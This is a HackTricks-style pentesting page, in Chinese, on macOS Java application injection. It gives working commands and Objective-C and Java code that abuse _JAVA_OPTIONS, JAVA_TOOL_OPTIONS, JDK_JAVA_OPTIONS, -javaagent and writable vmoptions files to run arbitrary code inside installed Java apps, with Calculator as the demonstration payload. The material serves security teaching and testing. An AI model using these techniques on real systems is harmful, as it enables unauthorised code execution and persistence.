# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 枚举

查找系统中已安装的 Java applications。已发现，**Info.plist** 中的 Java apps 会包含一些含有字符串 **`java.`** 的 Java 参数，因此可以搜索该字符串：
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

环境变量 **`_JAVA_OPTIONS`** 可用于在 Java 应用程序启动时注入任意 Java VM 参数。<sup>[[1]](#references)</sup>

Java 启动堆栈还支持两个定义更明确、作用域不同的变量：

- `JAVA_TOOL_OPTIONS` 在创建 VM 时读取，包括某些不经过 `java` launcher 的嵌入式启动路径。它可以注入 `-javaagent`、`-agentlib` 或 `-agentpath` 等 instrumentation 选项。<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` 由 `java` launcher 添加到其命令行之前。用于选择主类或终止 launcher 的选项会被禁止，但 `-javaagent` 可以使用。<sup>[[5]](#references)</sup>

当攻击者还能够提供一个兼容且可读取的 agent 时，这三个变量都应被视为 JVM code-execution 控制项。`_JAVA_OPTIONS` 属于 HotSpot implementation detail，因此应根据确切的 vendor 和版本进行验证；对于可移植的测试，`JAVA_TOOL_OPTIONS` 或 `JDK_JAVA_OPTIONS` 更为合适。
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
要将其作为新进程执行，而不是当前终端的子进程，可以使用：
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
然而，该技术会在执行的应用程序中触发错误。更隐蔽的替代方法是创建一个 Java agent，并使用 `-javaagent`：<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> 使用与应用程序**不同的 Java 版本**创建 agent，可能会导致 agent 和应用程序同时崩溃。

agent 可能位于：
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
要编译该 agent，请运行：
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
使用 `manifest.txt`：
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
然后导出环境变量，并像这样运行 Java 应用程序：
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions 文件

此文件支持在执行 Java 时指定 **Java parameters**。你可以使用之前的一些技术来更改 Java parameters，并**使进程执行任意命令**。\
此外，此文件还可以通过 `include` directive **包含其他文件**，因此你也可以更改被包含的文件。

更进一步，一些 Java apps 会**加载多个 `vmoptions` 文件**。

某些 applications（例如 Android Studio）会在其**输出中指示它们查找这些文件的位置**：<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
如果没有，你可以使用以下命令检查：
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
注意，在此示例中，Android Studio 会尝试加载 **`/Applications/Android Studio.app.vmoptions`**，该位置中 **`admin` 组中的任何用户都具有写入权限**。

## References

- [1] [OpenJDK — `arguments.cpp` 中的 `_JAVA_OPTIONS` 解析](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — `java.lang.instrument` 包规范](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — 配置 JVM 选项和平台属性](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [`java` launcher — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
